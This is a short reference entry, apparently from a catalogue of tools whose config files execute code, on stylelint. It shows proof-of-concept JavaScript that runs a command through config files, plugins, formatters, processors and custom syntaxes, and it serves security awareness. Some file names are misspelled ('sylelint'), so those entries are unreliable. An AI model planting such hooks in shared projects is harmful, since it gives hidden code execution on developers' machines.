---
title: stylelint
tags:
- cli
- config-file
- eval-js
references:
- https://stylelint.io/user-guide/configure
- https://stylelint.io/developer-guide/syntaxes
- https://stylelint.io/developer-guide/formatters
- https://stylelint.io/developer-guide/plugins
files: ['sylelint.config.js', 'sylelint.config.cjs', 'sylelint.config.mjs', '.stylelintrc.js', '.stylelintrc.cjs', '.stylelintrc.mjs', '.stylelintrc', '.stylelintrc.yml', '.stylelintrc.yaml', '.stylelintrc.json', 'package.json']
---

`stylelint` is a CSS linter with many configuration file:

- sylelint.config.js
- sylelint.config.cjs
- sylelint.config.mjs
- .stylelintrc.js
- .stylelintrc.cjs
- .stylelintrc.mjs
- .stylelintrc
- .stylelintrc.yml
- .stylelintrc.yaml
- .stylelintrc.json
- package.json

## Custom rules

If `sylelint.config.js`, `sylelint.config.cjs`, `sylelint.config.mjs`, `.sytlelintrc.js`, `.stylelintrc.cjs` or `.stylelintrc.mjs` is used, an attack can execute JS directly in the rules definition:

```js
import { execSync } from "node:child_process";
/** @type {import('stylelint').Config} */
execSync("id");
export default {
	"rules": {},
};
```

## Custom plugin

A custom plugin can execute JavaScript:

```json
{
  "rules": {},
  "plugins": ["./pwn.cjs"]
}
```

```js
require("node:child_process").execSync("id");
module.exports = { "ruleName": "plugin/pwn-plugin" };
```

## Custom formatter

A custom formatter can execute JavaScript:

```json
{
  "rules": {},
  "formatter": "./pwn.js",
}
```

```js
import { execSync } from "node:child_process";
/**
 * @type {import('stylelint').Formatter}
 */
export default function formatter(results, returnValue) {
	execSync("id");
	return "";
}
```

## Custom processor

A custom processor can execute JavaScript:

```json
{
  "rules": {},
  "processors": [
    "./pwn.js",
  ],
}
```

```js
import { execSync } from "node:child_process";
/** @type {import("stylelint").Processor} */
export default function myProcessor() {
	return {
		name: "pwn-processor",
		postprocess(result, root) {
			execSync("id");
		},
	};
}
```

## Custom syntax

A custom syntax can execute JavaScript.

```js
import pwnSyntax from "./pwn.js";
/** @type {import('stylelint').Config} */
export default {
	"rules": {},
    "overrides": [
		{
			"files": ["*.css"],
			"extends": [],
			"customSyntax": pwnSyntax,
			"rules": {},
		},
	],
};
```

```js
import postcss from "postcss";
import { execSync } from "node:child_process";
function parse(css, opts) {
	execSync("id");
	const root = postcss.root();
	return root;
}
function stringify(node, builder) {
	postcss.stringify(node, builder);
}
export default { parse, stringify };
```
